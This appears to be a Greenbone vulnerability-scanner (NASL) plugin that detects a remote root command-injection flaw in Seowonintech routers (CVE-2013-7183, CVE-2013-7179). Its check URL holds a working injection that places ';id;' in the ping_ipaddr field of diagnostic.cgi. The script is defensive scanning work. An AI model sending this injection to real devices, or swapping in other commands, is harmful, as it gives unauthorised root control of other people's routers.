# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:acme:thttpd";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103745");
  script_version("2025-03-20T05:38:32+0000");
  script_cve_id("CVE-2013-7183", "CVE-2013-7179");
  script_tag(name:"cvss_base", value:"8.3");
  script_tag(name:"cvss_base_vector", value:"AV:A/AC:L/Au:N/C:C/I:C/A:C");

  script_name("Seowonintech Routers Remote Root Command Execution Vulnerability");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/122126/Seowonintech-Remote-Root.html");

  script_tag(name:"last_modification", value:"2025-03-20 05:38:32 +0000 (Thu, 20 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-06-24 12:51:39 +0200 (Mon, 24 Jun 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_thttpd_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("thttpd/detected");

  script_tag(name:"solution", value:"Ask the vendor for an Update.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"The remote Seowonintech Router is prone to a remote root command-execution vulnerability.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to execute arbitrary commands
  within the context of root.");

  script_tag(name:"affected", value:"Seowonintech Router Firmware <= 2.3.9 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

# nb: No get_app_location() as thttpd is only used within this product and there is no point
# in linking to the detection of it.
if(!port = get_app_port(cpe:CPE))
  exit(0);

url = "/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q%20-s%200%20127.0.0.1;id;&ping_count=1&action=Apply&html_view=ping";

if(http_vuln_check(port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+", check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(0);
